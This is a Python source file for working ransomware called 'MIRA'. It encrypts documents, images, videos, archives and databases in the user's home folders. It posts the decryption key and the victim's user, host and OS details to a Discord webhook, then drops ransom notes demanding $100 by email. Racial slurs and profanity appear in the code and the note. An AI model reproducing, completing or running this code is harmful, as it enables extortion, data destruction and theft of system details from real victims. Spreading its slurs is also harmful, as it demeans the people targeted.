import os
import base64
import time
import random
import string
import platform
import getpass
import datetime
import json
from cryptography.fernet import Fernet
import requests

webhook_url = "https://discordapp.com/api/webhooks/YOUR WEBHOOK MY NIGGA"
note_file = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + ".txt"

encrypt_these = [
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".zip", ".rar", ".7z", ".txt", ".jpg", ".jpeg", ".png",
    ".mp4", ".mkv", ".avi", ".mp3", ".sql", ".db", ".csv"
]

dont_touch = [".exe", ".dll", ".sys", ".pyc", ".py", note_file.lower()]

target_folders = [
    os.path.expanduser("~\\Documents"),
    os.path.expanduser("~\\Desktop"),
    os.path.expanduser("~\\Downloads"),
    os.path.expanduser("~\\Pictures"),
    os.path.expanduser("~\\Videos"),
    os.path.expanduser("~\\Music")
]

def scramble(s):
    return ''.join(chr((ord(c) - 97 + 13) % 26 + 97) if 'a'<=c<='z' else 
                   chr((ord(c) - 65 + 13) % 26 + 65) if 'A'<=c<='Z' else c for c in s)

def hide(s):
    return base64.b64encode(scramble(s).encode()).decode()

u = base64.b64decode(hide("hfr")).decode()
h = base64.b64decode(hide("ubfganzr")).decode()
o = base64.b64decode(hide("bf")).decode()

def send_hit(k, info):
    try:
        ks = base64.urlsafe_b64encode(k).decode()
        p = {
            "embeds": [{
                "title": f"MIRA RANSOMWARE - New Victim {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}",
                "color": 0xFF0000,
                "fields": [
                    {"name": "Victim Info", "value": info, "inline": False},
                    {"name": "Decrypt Key (base64)", "value": f"```{ks}```", "inline": False}
                ]
            }],
            "username": "MiraBot"
        }
        requests.post(webhook_url, json=p, timeout=6)
        time.sleep(random.uniform(1.2, 4.5))
    except:
        pass

def write_note(where, keystr):
    msg = f"""𝖸𝖮𝖴 𝖦𝖮𝖳 𝖬𝖨𝖱𝖠 𝖱𝖠𝖭𝖲𝖮𝖬𝖶𝖠𝖱𝖤 𝖭𝖨𝖦𝖦𝖠

All your docs, pics, vids, zips and important files are encrypted by MIRA.

To unlock your shit:
- Pay $100 right now
- Email proof of payment + this key + your machine name to: blaxkmira128@gmail.com

Key (base64): {keystr}

Machine: {platform.node()}   User: {getpass.getuser()}
OS: {platform.system()} {platform.release()}
Infected: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

No email = files gone forever.  
Contact fast or stay fucked.
MIRA out.
"""
    try:
        open(os.path.join(where, note_file), "w", encoding="utf-8").write(msg)
    except:
        pass

def fuck_file(p, f):
    try:
        data = open(p, "rb").read()
        enc = f.encrypt(data)
        open(p, "wb").write(enc)
        time.sleep(0.03 + random.random() * 0.09)
    except:
        pass

def scan_and_encrypt(f):
    cnt = 0
    for start in target_folders:
        if not os.path.exists(start):
            continue
        for root, dirs, files in os.walk(start):
            for name in files:
                ext = os.path.splitext(name.lower())[1]
                if ext in encrypt_these and ext not in dont_touch:
                    fullpath = os.path.join(root, name)
                    fuck_file(fullpath, f)
                    cnt += 1
                    if cnt % 10 == 0:
                        time.sleep(random.uniform(0.7, 1.8))
    return cnt

key = Fernet.generate_key()
fernet = Fernet(key)

victim = f"User: {getpass.getuser()}\nHost: {platform.node()}\nOS: {platform.platform()}"
send_hit(key, victim)

total = scan_and_encrypt(fernet)

keytext = base64.urlsafe_b64encode(key).decode()


for folder in target_folders:
    if os.path.exists(folder):
        write_note(folder, keytext)

print(f"done {total} files")
